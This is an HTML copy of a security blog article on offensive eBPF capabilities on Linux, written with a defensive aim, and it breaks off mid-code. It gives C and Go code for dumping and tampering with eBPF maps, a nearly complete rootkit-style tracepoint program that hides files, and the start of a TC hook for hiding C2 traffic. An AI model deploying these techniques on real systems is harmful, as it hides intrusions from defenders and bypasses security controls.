<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://sysdig.com/blog/ebpf-offensive-capabilities/">Original</a>
    <h1>eBPF Offensive Capabilities – Get Ready for Next-Gen Malware (2023)</h1>
    
    <div id="readability-page-1" class="page"><div>

				
				<div>
<p>It’s not a mystery that<a href="https://ebpf.io" target="_blank" rel="noreferrer noopener nofollow"> eBPF</a> (Extended Berkeley Packet Filter) is a powerful technology, and given its nature, it can be used for good and bad purposes. In this article, we will explore some of the offensive capabilities that eBPF can provide to an attacker and how to defend against them.</p>



<p>eBPF has gained a lot of attention since its first release in 2014 into the Linux kernel (Kernel 4.4). This powerful technology allows one to run programs deep inside the Linux kernel without the need to write kernel modules or load kernel drivers. These programs are written in a restricted <em>C-like</em> language and compiled into bytecode that is executed by the kernel in the eBPF Virtual Machine. eBPF programs, given their nature, don’t have the usual lifecycle of a user-space process, but are rather executed when certain (programmer-specified) kernel events occur.</p>



<p>Those events take the name of <strong>hooks</strong> and are placed in various places in the kernel, such as network sockets, tracepoints, kprobes, uprobes, and more. They can be used for many different purposes, such as tracing, networking, and security.</p>



<p>In fact, in the many different security monitoring tools that exist today, <a href="https://sysdig.com/opensource/falco/" target="_blank" rel="noreferrer noopener">Falco</a> being one of them, eBPF can be used to monitor the system for malicious activity, performance analysis, and also enforce security policies.</p>



<h2 id="probes"><strong>Probes everywhere – eBPF hooks</strong></h2>



<p>eBPF programs can be <em>attached</em> to many different hooks inside the kernel, and the list is growing with every new kernel release. These hooks are called <em>probes</em> and they are placed in various places in the kernel. Here, we’ll expand upon a few of them.</p>



<ol>
<li><strong>Kprobes</strong> – Kernel probes are used to instrument kernel functions. They are placed at the beginning or at the end of a function (<strong>Kretprobe</strong>) and they can be used to trace the execution of a function, to modify the arguments passed to the function, or to skip the execution of the function entirely.</li>



<li><strong>Uprobes</strong> – User probes are used to instrument user-space functions. They can be placed inside a function or any given address (<strong>Uretprobe</strong> exists too). They are different from Kprobes in the sense that they are used to instrument user-space.</li>



<li><strong>Tracepoints</strong> – Tracepoints are static markers placed at various points throughout the kernel. They are used to trace the execution of the kernel. The main difference with kprobes is that they are codified by the kernel developers when they implement changes in the kernel.</li>



<li><strong>TC</strong> or <strong>Traffic Control</strong> – Used to monitor and control the network traffic, they are similar to <em>eXpress Data Path</em> (XDP) programs, but they are executed after the packet has been processed by the kernel. They can be used to modify the packet or to drop it entirely.</li>



<li><strong>XPD</strong> or <strong>eXpress Data Path</strong> – Like traffic control hooks, they are used to monitor network packets, are way faster than TC hooks because they are executed before the packet is processed by the kernel, and they can be used to entirely modify the packet.</li>
</ol>



<p>With this many hooks available, eBPF programs can be used to monitor and modify the execution of the kernel. This is why eBPF is so powerful, and also why it can be used for bad purposes too.</p>



<h2 id="eBPF"><strong>eBPF programs</strong></h2>



<p>eBPF programs are compiled into bytecode that is executed by the kernel. The eBPF programs are loaded into the kernel using the <code>bpf()</code> syscall – the syscall signature looks like this:</p>


<pre aria-describedby="shcb-language-1" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code><span>int</span> bpf(<span>int</span> cmd, union bpf_attr *attr, unsigned <span>int</span> size);</code></span><small id="shcb-language-1"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>The <code>cmd</code> parameter is used to specify the operation to perform, the <code>attr</code> parameter is used to pass the arguments to the syscall, and the <code>size</code> parameter is used to specify the size of the <code>attr</code> parameter.</p>



<p>There are many different possible commands, some of them are:</p>


<pre aria-describedby="shcb-language-2" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code>enum bpf_cmd {
    BPF_MAP_CREATE,   <span>/* create map */</span>
    BPF_MAP_LOOKUP_ELEM, <span>/* lookup element in map */</span>
    BPF_MAP_UPDATE_ELEM, <span>/* update element in map */</span>
    BPF_MAP_DELETE_ELEM, <span>/* delete element in map */</span>
    BPF_MAP_GET_NEXT_KEY, <span>/* get next key in map */</span>
    BPF_PROG_LOAD,   <span>/* load BPF program */</span>
    ...
    ...
};
</code></span><small id="shcb-language-2"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>Right now, we are interested in the <code>BPF_PROG_LOAD</code> command. This command is used to load an eBPF program into the kernel, and the <code>attr</code> parameter will specify the type of the program to load, the bytecode, the size of the bytecode, and other parameters. The <code>bpf()</code> syscall will return a <em>file descriptor</em> related to the program being loaded. This file descriptor can be used to attach the program to a hook, or to unload the program from the kernel. The program will remain in the kernel memory until the file descriptor is closed.</p>



<p>Fortunately for us, we don’t have to directly call the <code>bpf()</code> syscall in order to create eBPF programs. There are many different libraries that can be used to create eBPF programs, some of them are:</p>



<ul>
<li><a href="https://github.com/libbpf/libbpf">libbpf</a> – written in C</li>



<li><a href="https://github.com/aquasecurity/libbpfgo">libbpfgo</a> – written in Go</li>



<li><a href="https://github.com/cilium/ebpf">ebpf-go</a> – written in Go</li>
</ul>



<p>We will use <code>libbpfgo</code> in this article, but the concepts are the same for all the libraries.</p>



<h3>Kernel-mode to user-mode communication and vice-versa</h3>



<p>eBPF programs are executed in the kernel, but they can communicate with user-space programs and vice-versa. This is done using special objects called <strong>maps</strong>. Maps are key-value stores that can be used to exchange data between the kernel and user-space. They are created using the <code>BPF_MAP_CREATE</code> command, and they can be of different types. Some of them are:</p>



<ul>
<li><strong>BPF_MAP_TYPE_ARRAY</strong> – an array of elements, each element can be accessed using an index.</li>



<li><strong>BPF_MAP_TYPE_HASH</strong> – a hash table, each element can be accessed using a key.</li>



<li><strong>BPF_MAP_TYPE_PERCPU_ARRAY</strong> – an array of elements, each element can be accessed using an index, but uses a different memory region per CPU.</li>



<li><strong>BPF_MAP_TYPE_PERCPU_HASH</strong> – a hash table, each element can be accessed using a key, but uses a different memory region per CPU.</li>



<li><strong>BPF_MAP_TYPE_STACK</strong> – a stack of elements, each element can be accessed using an index, the elements are stored in a LIFO fashion.</li>



<li><strong>BPF_MAP_TYPE_QUEUE</strong> – a queue of elements, each element can be accessed using an index, the elements are stored in a FIFO fashion.</li>



<li><strong>BPF_MAP_TYPE_PERF_EVENT_ARRAY</strong> – a special map used to send events to user-space.</li>
</ul>



<p>For our purpose, we will use a <code>BPF_MAP_TYPE_HASH</code> to share some structs between the user-space and the kernel and a <code>BPF_MAP_TYPE_PERF_EVENT_ARRAY</code> to send events to user-space.</p>



<h3>eBPF programs format</h3>



<p>As we said before, eBPF programs are written in a restricted <em>C-like</em> language which is then translated into bytecode. The eBPF virtual machine is a 64-bit <strong><em>RISC</em></strong> machine, and it has 11 registers and a fixed size (512 bytes) stack. The registers are:</p>



<ul>
<li><strong>r0</strong> – stores return values, both for function calls and the current program exit code.</li>



<li><strong>r1</strong>–<strong>r5</strong> – used as function call arguments, upon program start r1 contains the “context” argument pointer.</li>



<li><strong>r6</strong>–<strong>r9</strong> – these get preserved between kernel function calls.</li>



<li><strong>r10</strong> – stack pointer.</li>
</ul>



<p>Nonetheless, the eBPF virtual machine can also use 32-bit addressing if the most significant bit of the register is zeroed.</p>



<p>This source-to-bytecode translation is handled by <strong><code>clang</code> </strong>which can easily target the eBPF virtual architecture. In order to compile a C program into eBPF bytecode, we can use the following command:</p>


<pre aria-describedby="shcb-language-3" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code>clang -target bpf -c program.c -o program.o</code></span><small id="shcb-language-3"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>This will compile the <code>program.c</code> file into <code>program.o</code> which is the bytecode file. This file can then be relocated and loaded into the kernel using the libraries we mentioned before.</p>



<h3><strong>JIT compilation, Verifier, and ALU sanitization</strong></h3>



<p>Due to its performance-critical nature, eBPF programs are compiled from VM Bytecode into native machine code by the kernel. This is called <strong>JIT</strong> or <strong>Just In Time</strong> compilation, and is done only once (when the program is loaded). Unless the kernel is compiled with <code>CONFIG_BPF_JIT_ALWAYS_ON=false</code>, the compiled program is then stored in the kernel memory and is executed every time the hook is triggered.</p>



<p>Executing untrusted code inside the kernel may be a really dangerous thing, and this is why the kernel developers implemented a <strong>verifier </strong>that checks the bytecode before compiling it, this verifier checks that the program is safe to execute, and it also checks that the program is not too complex. This is done to avoid <a href="https://sysdig.com/blog/how-to-prevent-ddos-attack-cloud/">denial of services</a> (DoS) attacks. The verifier is also used to check that the program is not trying to access memory outside the stack, or that it is not trying to access memory that is not mapped. This is done to avoid memory corruption attacks (ALU sanitization).</p>



<p>This safety is achieved by emulating the sequence of instructions and checking that the registers are used correctly. Below are some of the checks performed by the verifier, to name a few:</p>



<ul>
<li>Pointer bounds checking</li>



<li>Verifying that the stack’s reads are preceded by stack writes</li>



<li>Preventing the use of unbounded loops</li>



<li>Register value tracking</li>



<li>Branch pruning</li>



<li>And many more…</li>
</ul>



<p>More information about the verifier can be found <a href="https://docs.kernel.org/bpf/verifier.html">here</a>.</p>



<h3>eBPF offensive capabilities</h3>



<p>Given the knowledge we have so far, we can start to think about some offensive capabilities that eBPF programs can provide. Below are some of them:</p>



<ul>
<li><strong>Abusing direct map access</strong> – eBPF programs can access maps directly, meaning that if we have access to a map file descriptor, we can modify the logic of the program.</li>



<li><strong>Abusing Kprobes</strong> – eBPF programs use carefully crafted Kprobes to hook into kernel functions, so we can modify the behavior of the kernel like hiding processes or files.</li>



<li><strong>Abusing TC hook</strong> – eBPF programs can be attached to the TC hook, meaning that we can use eBPF programs to modify the traffic of a specific interface even hiding malicious traffic.</li>



<li><strong>Abusing Uprobes</strong> – eBPF programs can use Uprobes to hook into user-space functions, meaning that we can modify the behavior of user-space programs.</li>
</ul>



<p>Following, we will see some examples of these capabilities.</p>



<h4>Abusing direct map access</h4>



<p>Due to their nature, maps are a great target for attackers since writing to a map could modify the logic of the underlying eBPF program. Assume we are analyzing a firewall implementation entirely done with eBPF. The user-space component could talk over maps to the kernel to update the list of firewall rules. In order to do this, we would need access to that map file description. That’s actually possible thanks to <code>BPF_MAP_GET_NEXT_ID</code> , <code>BPF_MAP_GET_NEXT_KEY</code> and <code>BPF_MAP_LOOKUP_ELEM</code> commands. Root permission is needed.</p>



<p>First of all, we need to start looping through all the available maps. This can be done using the <code>BPF_MAP_GET_NEXT_ID</code> command, which will return the next available map id. We can use this command to loop through all the available maps. The following code shows how to do this:</p>


<pre aria-describedby="shcb-language-4" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code>static <span>int</span> bpf_obj_get_next_id(__u32 start_id, __u32 *next_id)
{
    const size_t attr_sz = offsetofend(union bpf_attr, open_flags);
    union bpf_attr attr;
    <span>int</span> err;

    memset(&amp;attr, <span>0</span>, attr_sz);
    attr.start_id = start_id;

    err = sys_bpf(BPF_MAP_GET_NEXT_ID, &amp;attr, attr_sz);
    <span>if</span> (!err)
        *next_id = attr.next_id;

    <span>return</span> err;
}</code></span><small id="shcb-language-4"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>To loop through all the available maps, we can do something like this:</p>


<pre aria-describedby="shcb-language-5" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code><span>while</span> (bpf_obj_get_next_id(next_id, &amp;next_id) == <span>0</span>) {
    <span>//</span> <span>do</span> something with the id
}</code></span><small id="shcb-language-5"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>Once we have the map id, we can use the <code>BPF_MAP_GET_FD_BY_ID</code> command to get the file descriptor of the map. This can be done in the following way:</p>


<pre aria-describedby="shcb-language-6" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code><span>int</span> bpf_map_get_fd_by_id_opts(uint32_t id, const struct bpf_get_fd_by_id_opts *opts)
{
    const size_t attr_sz = offsetofend(union bpf_attr, open_flags);
    union bpf_attr attr;
    <span>int</span> fd;

    <span>if</span> (!OPTS_VALID(opts, bpf_get_fd_by_id_opts))
        <span>return</span> libbpf_err(-EINVAL);

    memset(&amp;attr, <span>0</span>, attr_sz);
    attr.map_id = id;
    attr.open_flags = OPTS_GET(opts, open_flags, <span>0</span>);

    fd = sys_bpf_fd(BPF_MAP_GET_FD_BY_ID, &amp;attr, attr_sz);
    <span>return</span> libbpf_err_errno(fd);
}</code></span><small id="shcb-language-6"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>Then we can retrieve the map file descriptor:</p>


<pre aria-describedby="shcb-language-7" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code><span>int</span> fd = bpf_map_get_fd_by_id(next_id);
</code></span><small id="shcb-language-7"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>Once we have the file descriptor, we can get the map type and the map name using the <code>BPF_OBJ_GET_INFO_BY_FD</code> command:</p>


<pre aria-describedby="shcb-language-8" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code><span>int</span> bpf_obj_get_info_by_fd(<span>int</span> bpf_fd, void *info, __u32 *info_len)
{
    const size_t attr_sz = offsetofend(union bpf_attr, info);
    union bpf_attr attr;
    <span>int</span> err;

    memset(&amp;attr, <span>0</span>, attr_sz);
    attr.info.bpf_fd = bpf_fd;
    attr.info.info_len = *info_len;
    attr.info.info = ptr_to_u64(info);

    err = sys_bpf(BPF_OBJ_GET_INFO_BY_FD, &amp;attr, attr_sz);
    <span>if</span> (!err)
        *info_len = attr.info.info_len;
    <span>return</span> libbpf_err_errno(err);
}
</code></span><small id="shcb-language-8"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>Then we can retrieve the map type and the map name:</p>


<pre aria-describedby="shcb-language-9" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code>struct bpf_map_info info = {};
__u32 info_len = sizeof(info);
<span>int</span> ret = bpf_obj_get_info_by_fd(fd, &amp;info, &amp;info_len);</code></span><small id="shcb-language-9"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>The struct <code>bpf_map_info</code> contains the map type and the map name. We can read them this way:</p>


<pre aria-describedby="shcb-language-10" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code><span>printf</span>(<span>&#34;map name: %s\n&#34;</span>, info.name);
<span>printf</span>(<span>&#34;map type: %d\n&#34;</span>, info.type);</code></span><small id="shcb-language-10"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>This is actually really useful if we want to filter the maps by name or by type:</p>


<pre aria-describedby="shcb-language-11" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code><span>if</span> (!strcmp(info.name, <span>&#34;firewall&#34;</span>) || info.type != BPF_MAP_TYPE_HASH) {
    <span>//</span> <span>do</span> something
}</code></span><small id="shcb-language-11"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>Once we have all the needed information, we can start to interact with the map. For example, we can retrieve all the keys of the map using the <code>BPF_MAP_GET_NEXT_KEY</code> command:</p>


<pre aria-describedby="shcb-language-12" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code><span>int</span> bpf_map_get_next_key(<span>int</span> fd, const void *key, void *next_key)
{
    const size_t attr_sz = offsetofend(union bpf_attr, next_key);
    union bpf_attr attr;
    <span>int</span> ret;

    memset(&amp;attr, <span>0</span>, attr_sz);
    attr.map_fd = fd;
    attr.key = ptr_to_u64(key);
    attr.next_key = ptr_to_u64(next_key);

    ret = sys_bpf(BPF_MAP_GET_NEXT_KEY, &amp;attr, attr_sz);
    <span>return</span> libbpf_err_errno(ret);
}</code></span><small id="shcb-language-12"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>And then we can look up the keys:</p>


<pre aria-describedby="shcb-language-13" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code>unsigned <span>int</span> key = -<span>1</span>;
unsigned <span>int</span> next_key = -<span>1</span>;
<span>while</span> (bpf_map_get_next_key(fd, key, next_key) == <span>0</span>) {
    <span>//</span> <span>do</span> something with the key
}</code></span><small id="shcb-language-13"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>With the <code>BPF_MAP_LOOKUP_ELEM</code> command, we can look up the value of a given key:</p>


<pre aria-describedby="shcb-language-14" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code><span>int</span> bpf_map_lookup_elem(<span>int</span> fd, const void *key, void *value)
{
    const size_t attr_sz = offsetofend(union bpf_attr, flags);
    union bpf_attr attr;
    <span>int</span> ret;

    memset(&amp;attr, <span>0</span>, attr_sz);
    attr.map_fd = fd;
    attr.key = ptr_to_u64(key);
    attr.value = ptr_to_u64(value);

    ret = sys_bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr, attr_sz);
    <span>return</span> libbpf_err_errno(ret);
}</code></span><small id="shcb-language-14"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>The final code will look like this:</p>


<pre aria-describedby="shcb-language-15" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code><span>int</span> main(<span>int</span> argc, char **argv)
{
    unsigned <span>int</span> next_id = <span>0</span>;

    <span>while</span> (bpf_obj_get_next_id(next_id, &amp;next_id, BPF_MAP_GET_NEXT_ID) == <span>0</span>)
    {
        <span>int</span> fd = bpf_map_get_fd_by_id(next_id);

        <span>if</span> (fd &lt; <span>0</span>)
        {
            <span>printf</span>(<span>&#34;bpf_map_get_fd_by_id failed: %d (%d)\n&#34;</span>, fd, errno);
            <span>return</span> <span>1</span>;
        }

        struct bpf_map_info info = {};
        __u32 info_len = sizeof(info);
        <span>int</span> ret = bpf_obj_get_info_by_fd(fd, &amp;info, &amp;info_len);

        <span>if</span> (ret &lt; <span>0</span>)
        {
            <span>printf</span>(<span>&#34;bpf_obj_get_info_by_fd failed: %d (%d)\n&#34;</span>, ret, errno);
            <span>return</span> <span>1</span>;
        }

        <span>printf</span>(<span>&#34;map fd: %d\n&#34;</span>, fd);
        <span>printf</span>(<span>&#34;map name: %s\n&#34;</span>, info.name);
        <span>printf</span>(<span>&#34;map type: %s\n&#34;</span>, bpf_map_type_to_string(info.type));
        <span>printf</span>(<span>&#34;map key size: %d\n&#34;</span>, info.key_size);
        <span>printf</span>(<span>&#34;map value size: %d\n&#34;</span>, info.value_size);
        <span>printf</span>(<span>&#34;map max entries: %d\n&#34;</span>, info.max_entries);
        <span>printf</span>(<span>&#34;map flags: %d\n&#34;</span>, info.map_flags);
        <span>printf</span>(<span>&#34;map id: %d\n&#34;</span>, info.id);

        unsigned <span>int</span> next_key = <span>0</span>;

        <span>printf</span>(<span>&#34;keys:\n&#34;</span>);
        <span>while</span> (bpf_map_get_next_key(fd, &amp;next_key, &amp;next_key) == <span>0</span>)
        {
            void *value = malloc(info.value_size);
            ret = bpf_map_lookup_elem(fd, &amp;next_key, value);

            <span>if</span> (ret == <span>0</span>)
            {
                <span>printf</span>(<span>&#34;    - %d\n&#34;</span>, next_key);
                map_hexdump(value, info.value_size);
                <span>printf</span>(<span>&#34;\n&#34;</span>);
            }
        }

        <span>printf</span>(<span>&#34;------------------------\n&#34;</span>);
    }

    <span>return</span> <span>0</span>;
}</code></span><small id="shcb-language-15"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>Once we have access to the file descriptor, it’s just a matter of reversing the map content and interpreting it. This would allow an attacker to modify the map content and change the behavior of the eBPF program (e.g., bypassing security checks).</p>



<p>A funny attack could be abusing the <code>BPF_MAP_FREEZE</code> command, as stated in the documentation:</p>


<pre aria-describedby="shcb-language-16" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code>/*
 * BPF_MAP_FREEZE
 *  Description
 *      Freeze the permissions of the specified map.
 *
 *      Write permissions may be frozen by passing zero *flags*.
 *      Upon success, <span>no</span> future <span>syscall</span> invocations may alter the
 *      <span>map</span> <span>state</span> of *map_fd*. Write operations from eBPF programs
 *      are still possible <span>for</span> a frozen map.
 *
 *      Not supported <span>for</span> maps of type **BPF_MAP_TYPE_STRUCT_OPS**.
 *
 *  Return
 *      Returns zero on success. On error, -<span>1</span> is returned <span>and</span> *errno*
 *      is set appropriately.
 *<span>/</span></code></span><small id="shcb-language-16"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>Doing so would prevent any future syscall to alter the map state from userspace (e.g., bypassing security checks). This means that the map content can be modified only by eBPF programs.</p>



<h4>Hiding files with Kprobes</h4>



<p>Hooking syscalls from the kernel itself is quite handy when it comes to hiding files, folders, or even processes from the user. The following example shows how to hide a specific file from any command that tries to read it (e.g., <code>cat</code>, <code>nano</code>, <code>grep</code> etc.).</p>



<p>It works by setting a tracepoint on the <code>sys_enter</code> event which gets triggered every time a syscall is invoked, then it checks if the syscall id is <code>SYS_openat</code> and if the path matches the one we want to hide. If so, it overwrites the path with a null byte. This example uses maps to store both the target path and eventually the target process name and pid. This allows us to hide the file only for a specific process or for all the processes.</p>



<p>The first thing to do is create a new tracepoint using the <code>BPF_PROG_TYPE_RAW_TRACEPOINT</code> program type. This can be done like this:</p>


<pre aria-describedby="shcb-language-17" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code>SEC(<span>&#34;raw_tracepoint/sys_enter&#34;</span>)
<span>int</span> raw_tracepoint__sys_enter(struct bpf_raw_tracepoint_args *ctx)
{
    <span>//</span> your code here

    <span>return</span> <span>0</span>;
}</code></span><small id="shcb-language-17"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p><code>SEC</code> is a macro that is used to specify the section of the program. In this case, we are using the <code>raw_tracepoint/sys_enter</code> section. This section will be used by libbpf to attach the program to the <code>sys_enter</code> tracepoint.</p>



<p>The <code>bpf_raw_tracepoint_args</code> struct contains the arguments passed to the tracepoint. In this case, the first argument is a pointer to the <code>pt_regs</code> struct. This structure contains the registers of the current process. The second argument is the syscall id, so we want to check if the syscall id is <code>SYS_openat</code> and, if so, we want to overwrite the path with a null byte.</p>


<pre aria-describedby="shcb-language-18" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code>unsigned long syscall_id = ctx-&gt;args[<span>1</span>];
struct pt_regs *regs;
regs = (struct pt_regs *)ctx-&gt;args[<span>0</span>];
<span>if</span> (syscall_id == SYS_openat)
{
    <span>//</span> <span>do</span> something
}</code></span><small id="shcb-language-18"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>In order to communicate with the running program in user-mode, we shared a struct like the following:</p>


<pre aria-describedby="shcb-language-19" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code>struct target
{
    <span>int</span> pid;
    char procname[<span>16</span>];
    char path[<span>256</span>];
};

struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, u32);
    __type(value, struct target);
    __uint(max_entries, <span>1</span>);
} target SEC(<span>&#34;.maps&#34;</span>);</code></span><small id="shcb-language-19"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>The same struct must be defined on the golang side:</p>


<pre aria-describedby="shcb-language-20" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code>type Target struct {
    Pid  uint32
    Comm [<span>16</span>]byte
    Path [<span>256</span>]byte
}</code></span><small id="shcb-language-20"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>We then can update the struct from the user-space like this:</p>


<pre aria-describedby="shcb-language-21" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code>targetMap, err := bpfModule.GetMap(<span>&#34;target&#34;</span>)
<span>if</span> err != nil {
    fmt.Fprintln(os.Stderr, err)
    os.Exit(-<span>1</span>)
}

// update the <span>map</span>

key := uint32(<span>0x1337</span>)
var val Target
copy(val.Comm[:], procname)
copy(val.Path[:], filepath)
val.Pid = uint32(pid)
keyUnsafe := unsafe.Pointer(&amp;key)
valueUnsafe := unsafe.Pointer(&amp;val)
targetMap.Update(keyUnsafe, valueUnsafe)
</code></span><small id="shcb-language-21"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>In order to make everything work, we would need some utility functions since eBPF programs can’t use libc functions. The following functions are used to manipulate strings:</p>


<pre aria-describedby="shcb-language-22" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code>static __always_inline __u64
__bpf_strncmp(const void *<span>x</span>, const void *<span>y</span>, __u64 len)
{
    <span>//</span> implement strncmp
    <span>for</span> (<span>int</span> i = <span>0</span>; i &lt; len; i++)
    {
        <span>if</span> (((char *)<span>x</span>)[i] != ((char *)<span>y</span>)[i])
        {
            <span>return</span> ((char *)<span>x</span>)[i] - ((char *)<span>y</span>)[i];
        }
        <span>else</span> <span>if</span> (((char *)<span>x</span>)[i] == <span>&#39;\0&#39;</span>)
        {
            <span>return</span> <span>0</span>;
        }
    }

    <span>return</span> <span>0</span>;
}

static __always_inline __u64
__bpf_strlen(const void *<span>x</span>)
{
    <span>//</span> implement strlen
    __u64 len = <span>0</span>;
    <span>while</span> (((char *)<span>x</span>)[len] != <span>&#39;\0&#39;</span>)
    {
        len++;
    }
    <span>return</span> len;
}
</code></span><small id="shcb-language-22"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>The final code will look like this:</p>


<pre aria-describedby="shcb-language-23" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code><span>if</span> (syscall_id == SYS_openat)
{
    struct target *tar;
    u32 key = <span>0x1337</span>;
    tar = bpf_map_lookup_elem(&amp;target, &amp;key);
    <span>if</span> (!tar)
    {
        <span>return</span> <span>0</span>;
    }
    <span>else</span>
    {
        char pathname[<span>256</span>];
        char *pathname_ptr = (char *)PT_REGS_PARM2_CORE(regs);
        bpf_core_read_user_str(&amp;pathname, sizeof(pathname), pathname_ptr);

        char comm[<span>16</span>];
        bpf_get_current_comm(&amp;comm, sizeof(comm));

        u32 pid = bpf_get_current_pid_tgid() &gt;&gt; <span>32</span>;
        bool match = false;

        <span>if</span> (tar-&gt;pid != <span>0</span> &amp;&amp; pid == tar-&gt;pid)
        {
            match = true;
        }

        <span>if</span> (!match &amp;&amp; __bpf_strncmp(comm, tar-&gt;procname, sizeof(comm)) == <span>0</span>)
        {
            <span>if</span> (!match &amp;&amp; __bpf_strncmp(pathname, tar-&gt;path, sizeof(pathname)) == <span>0</span>)
            {
                match = true;
            }
        }
        <span>else</span>
        {
            <span>if</span> (!match &amp;&amp; __bpf_strncmp(pathname, tar-&gt;path, sizeof(pathname)) == <span>0</span>)
            {
                match = true;
            }
        }

        <span>if</span> (match)
        {

            <span>if</span> (bpf_probe_write_user(pathname_ptr, <span>&#34;\x00&#34;</span>, <span>1</span>) != <span>0</span>)
            {
                <span>return</span> <span>0</span>;
            }
        }
    }
}
</code></span><small id="shcb-language-23"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>Another approach to obtain the same result is by hooking <code>SYS_getdents</code> and filtering the file we want to hide from the list of files returned by the syscall.</p>



<p>From a defensive perspective, it’s possible to detect this kind of attack by using eBPF to monitor syscalls to <code>SYS_bpf</code> and check if the attacker is trying to load a program that hooks syscalls. This can be done by checking the <code>BPF_PROG_TYPE_RAW_TRACEPOINT</code> inside the <code>bpf_prog_info</code> struct.</p>



<h4>Traffic redirection with TC</h4>



<p>Another important feature of eBPF is the ability to modify incoming and outgoing traffic on the fly, which can be done using the TC hook. This hook is executed after the packet has been processed by the kernel, meaning that the packet has already been processed by the XDP hook if it was attached to the interface.</p>



<p>TC can be <em>abused</em> to hide malicious traffic and is really useful when it comes to hiding C2 traffic. The following example shows how to redirect all the traffic to a specific IP address. This way, anyone monitoring the traffic on the interface won’t be able to see the real destination of the packets.</p>



<p>The first thing to do is create a new TC hook like this:</p>


<pre aria-describedby="shcb-language-24" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code>SEC(<span>&#34;tc&#34;</span>)
<span>int</span> tc_prog(struct __sk_buff *skb)
{
    <span>return</span> TC_ACT_OK;
}</code></span><small id="shcb-language-24"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>The return value can be either <code>TC_ACT_OK</code> or <code>TC_ACT_SHOT</code>. The first one means that the packet should be processed normally, the second one means that the packet should be dropped, so pay attention to this otherwise you will end up dropping all the traffic.</p>



<p>The <code>struct __sk_buff</code> struct contains all the information about the packet. We can use this struct to retrieve the destination IP address and modify it. The following code shows how to do this:</p>


<pre aria-describedby="shcb-language-25" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code>struct iphdr *iph = (struct iphdr *)(skb-&gt;data + sizeof(struct ethhdr));
<span>if</span> ((void *)(iph + <span>1</span>) &gt; skb-&gt;data_end)
{
    <span>return</span> TC_ACT_OK;
}

<span>if</span> (iph-&gt;protocol == IPPROTO_TCP)
{
    <span>//</span> get tcphdr
    struct tcphdr *tcph = (struct tcphdr *)(iph + <span>1</span>);
    <span>if</span> ((void *)(tcph + <span>1</span>) &gt; skb-&gt;data_end)
    {
        <span>return</span> TC_ACT_OK;
    }

    // get tcp dst addr <span>and</span> dst port
    __u32 dst_addr = bpf_htonl(iph-&gt;daddr);
    __u16 dst_port = bpf_htons(tcph-&gt;dest);

    <span>if</span> (dst_addr == <span>0xDEADBEEF</span>)
    {
